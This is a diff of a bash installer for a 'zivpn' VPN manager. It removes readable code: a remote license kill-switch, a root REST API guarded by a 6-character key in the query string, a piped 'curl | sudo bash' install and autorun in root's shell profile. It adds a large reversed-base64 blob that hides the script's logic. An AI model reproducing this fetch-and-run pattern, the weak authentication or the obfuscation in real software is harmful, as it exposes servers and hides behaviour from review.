-CONFIG_FILE="/etc/zivpn/config.json"
-TMP_DB_FILE="${DB_FILE}.tmp"
-CURRENT_DATE=$(date +%s)
-SERVICE_RESTART_NEEDED=false
-
-if [ ! -f "$DB_FILE" ]; then exit 0; fi
-> "$TMP_DB_FILE"
-
-while IFS=':' read -r password expiry_date; do
-    if [[ -z "$password" ]]; then continue; fi
-
-    if [ "$expiry_date" -le "$CURRENT_DATE" ]; then
-        echo "User '${password}' has expired. Deleting permanently."
-        jq --arg pass "$password" 'del(.auth.config[] | select(. == $pass))' "$CONFIG_FILE" > "${CONFIG_FILE}.tmp" && mv "${CONFIG_FILE}.tmp" "$CONFIG_FILE"
-        SERVICE_RESTART_NEEDED=true
-    else
-        echo "${password}:${expiry_date}" >> "$TMP_DB_FILE"
-    fi
-done < "$DB_FILE"
-
-mv "$TMP_DB_FILE" "$DB_FILE"
-
-if [ "$SERVICE_RESTART_NEEDED" = true ]; then
-    echo "Restarting zivpn service due to user removal."
-    systemctl restart zivpn.service
-fi
-exit 0
-EOF
-    chmod +x /etc/zivpn/expire_check.sh
-    CRON_JOB_EXPIRY="* * * * * /etc/zivpn/expire_check.sh # zivpn-expiry-check"
-    (crontab -l 2>/dev/null | grep -v "# zivpn-expiry-check") | crontab -
-    (crontab -l 2>/dev/null; echo "$CRON_JOB_EXPIRY") | crontab -
-
-    echo "Setting up license check script and cron job..."
-    cat <<'EOF' > /etc/zivpn/license_checker.sh
-#!/bin/bash
-# Zivpn License Checker
-# This script is run by a cron job to periodically check the license status.
-
-# --- Configuration ---
-LICENSE_URL="https://raw.githubusercontent.com/altunnel/regip/main/ip"
-LICENSE_INFO_FILE="/etc/zivpn/.license_info"
-EXPIRED_LOCK_FILE="/etc/zivpn/.expired"
-TELEGRAM_CONF="/etc/zivpn/telegram.conf"
-LOG_FILE="/var/log/zivpn_license.log"
-
-# --- Logging ---
-log() {
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
-}
-
-# --- Helper Functions ---
-function get_host() {
-    local CERT_CN
-    CERT_CN=$(openssl x509 -in /etc/zivpn/zivpn.crt -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p' 2>/dev/null || echo "")
-    if [ "$CERT_CN" == "zivpn" ] || [ -z "$CERT_CN" ]; then
-        curl -4 -s ifconfig.me
-    else
-        echo "$CERT_CN"
-    fi
-}
-
-function get_isp() {
-    curl -s ipinfo.io | jq -r '.org // "N/A"'
-}
-
-
-# --- Telegram Notification Function ---
-send_telegram_message() {
-    local message="$1"
-    
-    if [ ! -f "$TELEGRAM_CONF" ]; then
-        log "Telegram config not found, skipping notification."
-        return
-    fi
-    
-    source "$TELEGRAM_CONF"
-    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
-        local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
-        curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "parse_mode=Markdown" > /dev/null
-        log "Simple telegram notification sent."
-    else
-        log "Telegram config found but token or chat ID is missing."
-    fi
-}
-
-# --- Main Logic ---
-log "Starting license check..."
-
-# 1. Get Server IP
-SERVER_IP=$(curl -4 -s ifconfig.me)
-if [ -z "$SERVER_IP" ]; then
-    log "Error: Failed to retrieve server IP. Exiting."
-    exit 1
-fi
-
-# 2. Get Local License Info
-if [ ! -f "$LICENSE_INFO_FILE" ]; then
-    log "Error: Local license info file not found. Exiting."
-    exit 1
-fi
-source "$LICENSE_INFO_FILE" # This loads CLIENT_NAME and EXPIRY_DATE
-
-# 3. Fetch Remote License Data
-license_data=$(curl -s "$LICENSE_URL")
-if [ $? -ne 0 ] || [ -z "$license_data" ]; then
-    log "Error: Failed to connect to license server. Exiting."
-    exit 1
-fi
-
-# 4. Check License Status from Remote
-license_entry=$(echo "$license_data" | grep -w "$SERVER_IP")
-
-if [ -z "$license_entry" ]; then
-    # IP not found in remote list (Revoked)
-    if [ ! -f "$EXPIRED_LOCK_FILE" ]; then
-        log "License for IP ${SERVER_IP} has been REVOKED."
-        systemctl stop zivpn.service
-        touch "$EXPIRED_LOCK_FILE"
-        local MSG="Notifikasi Otomatis: Lisensi untuk Klien \`${CLIENT_NAME}\` dengan IP \`${SERVER_IP}\` telah dicabut (REVOKED). Layanan zivpn telah dihentikan."
-        send_telegram_message "$MSG"
-    fi
-    exit 0
-fi
-
-# 5. IP Found, Check for Expiry or Renewal
-client_name_remote=$(echo "$license_entry" | awk '{print $1}')
-expiry_date_remote=$(echo "$license_entry" | awk '{print $2}')
-expiry_timestamp_remote=$(date -d "$expiry_date_remote" +%s)
-current_timestamp=$(date +%s)
-
-# Update local license info file with the latest from server
-if [ "$expiry_date_remote" != "$EXPIRY_DATE" ]; then
-    log "Remote license has a different expiry date (${expiry_date_remote}). Updating local file."
-    echo "CLIENT_NAME=${client_name_remote}" > "$LICENSE_INFO_FILE"
-    echo "EXPIRY_DATE=${expiry_date_remote}" >> "$LICENSE_INFO_FILE"
-    CLIENT_NAME=$client_name_remote
-    EXPIRY_DATE=$expiry_date_remote
-fi
-
-if [ "$expiry_timestamp_remote" -le "$current_timestamp" ]; then
-    # License is EXPIRED
-    if [ ! -f "$EXPIRED_LOCK_FILE" ]; then
-        log "License for IP ${SERVER_IP} has EXPIRED."
-        systemctl stop zivpn.service
-        touch "$EXPIRED_LOCK_FILE"
-        local host
-        host=$(get_host)
-        local isp
-        isp=$(get_isp)
-        log "Sending rich expiry notification via helper script..."
-        /usr/local/bin/zivpn_helper.sh expiry-notification "$host" "$SERVER_IP" "$CLIENT_NAME" "$isp" "$EXPIRY_DATE"
-    fi
-else
-    # License is ACTIVE (potentially renewed)
-    if [ -f "$EXPIRED_LOCK_FILE" ]; then
-        log "License for IP ${SERVER_IP} has been RENEWED/ACTIVATED."
-        rm "$EXPIRED_LOCK_FILE"
-        systemctl start zivpn.service
-        local host
-        host=$(get_host)
-        local isp
-        isp=$(get_isp)
-        log "Sending rich renewed notification via helper script..."
-        /usr/local/bin/zivpn_helper.sh renewed-notification "$host" "$SERVER_IP" "$CLIENT_NAME" "$isp" "$expiry_timestamp_remote"
-    else
-        log "License is active and valid. No action needed."
-    fi
-fi
-
-log "License check finished."
-exit 0
-EOF
-    chmod +x /etc/zivpn/license_checker.sh
-
-    CRON_JOB_LICENSE="*/5 * * * * /etc/zivpn/license_checker.sh # zivpn-license-check"
-    (crontab -l 2>/dev/null | grep -v "# zivpn-license-check") | crontab -
-    (crontab -l 2>/dev/null; echo "$CRON_JOB_LICENSE") | crontab -
-
-    # --- Telegram Notification Setup ---
-    if [ ! -f "/etc/zivpn/telegram.conf" ]; then
-        echo ""
-        read -p "Apakah Anda ingin mengatur notifikasi Telegram untuk status lisensi? (y/n): " confirm
-        if [[ "$confirm" == [yY] || "$confirm" == [yY][eE][sS] ]]; then
-            /usr/local/bin/zivpn_helper.sh setup-telegram
-        else
-            echo "Anda dapat mengaturnya nanti melalui menu Backup/Restore."
-        fi
-    fi
-
-    restart_zivpn
-
-    # --- API Setup ---
-    echo "--- Setting up REST API Service ---"
-    
-    # 1. Install Node.js v18
-    if ! command -v node &> /dev/null; then
-        echo "Node.js not found. Installing Node.js v18..."
-        curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-        sudo apt-get install -y nodejs
-    else
-        echo "Node.js is already installed."
-    fi
-    
-    # 2. Create API directory and files
-    mkdir -p /etc/zivpn/api
-    
-    cat <<'EOF' > /etc/zivpn/api/package.json
-{
-  "name": "zivpn-api",
-  "version": "1.0.0",
-  "description": "API for managing ZIVPN",
-  "main": "api.js",
-  "scripts": { "start": "node api.js" },
-  "dependencies": { "express": "^4.17.1" }
-}
-EOF
-
-    cat <<'EOF' > /etc/zivpn/api/api.js
-const express = require('express');
-const { execFile } = require('child_process');
-const fs = require('fs');
-const app = express();
-const PORT = 5888;
-const AUTH_KEY_PATH = '/etc/zivpn/api_auth.key';
-const ZIVPN_MANAGER_SCRIPT = '/usr/local/bin/zivpn-manager';
-
-const authenticate = (req, res, next) => {
-    const providedAuthKey = req.query.auth;
-    if (!providedAuthKey) return res.status(401).json({ status: 'error', message: 'Authentication key is required.' });
-
-    fs.readFile(AUTH_KEY_PATH, 'utf8', (err, storedKey) => {
-        if (err) return res.status(500).json({ status: 'error', message: 'Could not read authentication key.' });
-        if (providedAuthKey.trim() !== storedKey.trim()) return res.status(403).json({ status: 'error', message: 'Invalid authentication key.' });
-        next();
-    });
-};
-app.use(authenticate);
-
-const executeZivpnManager = (command, args, res) => {
-    execFile('sudo', [ZIVPN_MANAGER_SCRIPT, command, ...args], (error, stdout, stderr) => {
-        if (error) {
-            const errorMessage = stderr.includes('Error:') ? stderr : 'An internal server error occurred.';
-            return res.status(500).json({ status: 'error', message: errorMessage.trim() });
-        }
-        if (stdout.toLowerCase().includes('success')) {
-            res.json({ status: 'success', message: stdout.trim() });
-        } else {
-            res.status(400).json({ status: 'error', message: stdout.trim() });
-        }
-    });
-};
-
-app.all('/create/zivpn', (req, res) => {
-    const { password, exp } = req.query;
-    if (!password || !exp) return res.status(400).json({ status: 'error', message: 'Parameters password and exp are required.' });
-    executeZivpnManager('create_account', [password, exp], res);
-});
-app.all('/delete/zivpn', (req, res) => {
-    const { password } = req.query;
-    if (!password) return res.status(400).json({ status: 'error', message: 'Parameter password is required.' });
-    executeZivpnManager('delete_account', [password], res);
-});
-app.all('/renew/zivpn', (req, res) => {
-    const { password, exp } = req.query;
-    if (!password || !exp) return res.status(400).json({ status: 'error', message: 'Parameters password and exp are required.' });
-    executeZivpnManager('renew_account', [password, exp], res);
-});
-app.all('/trial/zivpn', (req, res) => {
-    const { exp } = req.query;
-    if (!exp) return res.status(400).json({ status: 'error', message: 'Parameter exp is required.' });
-    executeZivpnManager('trial_account', [exp], res);
-});
-
-app.listen(PORT, () => console.log('ZIVPN API server running on port ' + PORT));
-EOF
-
-    # 3. Install npm dependencies
-    echo "Installing API dependencies..."
-    npm install --prefix /etc/zivpn/api
-    
-    # 4. Create and enable systemd service
-    cat <<'EOF' > /etc/systemd/system/zivpn-api.service
-[Unit]
-Description=ZIVPN REST API Service
-After=network.target
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/etc/zivpn/api
-ExecStart=/usr/bin/node /etc/zivpn/api/api.js
-Restart=on-failure
-[Install]
-WantedBy=multi-user.target
-EOF
-    
-    systemctl daemon-reload
-    systemctl enable zivpn-api.service
-    systemctl start zivpn-api.service
-    
-    # 5. Generate initial API key
-    echo "Generating initial API key..."
-    local initial_api_key
-    initial_api_key=$(LC_ALL=C tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 6)
-    echo "$initial_api_key" > /etc/zivpn/api_auth.key
-    chmod 600 /etc/zivpn/api_auth.key
-    
-    # 6. Open firewall port
-    echo "Opening firewall port 5888 for API..."
-    iptables -I INPUT -p tcp --dport 5888 -j ACCEPT
-    
-    echo "--- API Setup Complete ---"
-
-
-    # --- System Integration ---
-    echo "--- Integrating management script into the system ---"
-    cp "$0" /usr/local/bin/zivpn-manager
-    chmod +x /usr/local/bin/zivpn-manager
-
-    PROFILE_FILE="/root/.bashrc"
-    if [ -f "/root/.bash_profile" ]; then PROFILE_FILE="/root/.bash_profile"; fi
-    
-    ALIAS_CMD="alias udpzivpn='/usr/local/bin/zivpn-manager'"
-    AUTORUN_CMD="/usr/local/bin/zivpn-manager"
-
-    grep -qF "$ALIAS_CMD" "$PROFILE_FILE" || echo "$ALIAS_CMD" >> "$PROFILE_FILE"
-    grep -qF "$AUTORUN_CMD" "$PROFILE_FILE" || echo "$AUTORUN_CMD" >> "$PROFILE_FILE"
-
-    echo "The 'menu' command is now available."
-    echo "The management menu will now open automatically on login."
-    
-    echo "-----------------------------------------------------"
-    echo "Advanced management setup complete."
-    echo "Password for temporary account (expires 24h): ${RANDOM_PASS}"
-    echo "-----------------------------------------------------"
-    read -p "Press Enter to continue to the management menu..."
-}
-
-# --- Main Script ---
-function main() {
-    # Non-interactive mode for API calls
-    if [ "$#" -gt 0 ]; then
-        local command="$1"
-        shift
-        case "$command" in
-            create_account)
-                _create_account_logic "$@"
-                ;;
-            delete_account)
-                _delete_account_logic "$@"
-                ;;
-            renew_account)
-                _renew_account_logic "$@"
-                ;;
-            trial_account)
-                _create_trial_account_logic "$@"
-                ;;
-            *)
-                echo "Error: Unknown command '$command'"
-                exit 1
-                ;;
-        esac
-        exit $?
-    fi
-
-    if [ ! -f "/etc/systemd/system/zivpn.service" ]; then
-        run_setup
-    fi
-
-    while true; do
-        show_menu
-    done
-}
-
-# Execute main function only when script is run directly, not sourced
-if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    main "$@"
-fi
+RzE='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
